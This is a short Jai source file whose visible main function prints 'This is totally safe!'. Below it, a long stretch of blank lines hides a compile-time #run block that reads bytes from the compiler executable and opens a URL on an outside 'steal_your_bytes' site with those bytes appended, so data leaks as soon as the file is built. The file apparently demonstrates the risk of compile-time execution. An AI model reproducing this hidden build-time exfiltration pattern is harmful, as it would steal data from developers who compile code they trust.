main :: () {
    print("This is totally safe!\n");
}
































































#run {
    #import "File";
    #import "Windows";
    #import "Windows_Utf8";

    bytes: [1024] u8;
    f, open_success := file_open("C:/jai-beta-0.1.091/bin/jai.exe");
    if open_success {
        defer file_close(*f);
        _, bytes_read := file_read(f, bytes.data, 16);

        sb: String_Builder;
        for string.{ bytes_read, bytes.data } {
            print_to_builder(*sb, "%", formatInt(it, 16, 2));
        }
        bytes_str := builder_to_string(*sb);
        print("bytes: %\n", bytes_str);

        sSi : STARTUPINFOW;
        sPi : PROCESS_INFORMATION;
        defer if sPi.hThread CloseHandle(sPi.hThread);
        defer if sPi.hProcess CloseHandle(sPi.hProcess);

        leak_bytes_command := tprint("cmd.exe /c start \"link\" \"https://theprogrammingjunkie.com/steal_your_bytes/%\"", bytes_str);
        print("command: %\n", leak_bytes_command);
        b := CreateProcessW(null, utf8_to_wide_new(leak_bytes_command,, temp), null, null, 0, 0, null, null, *sSi, *sPi);
    }
}

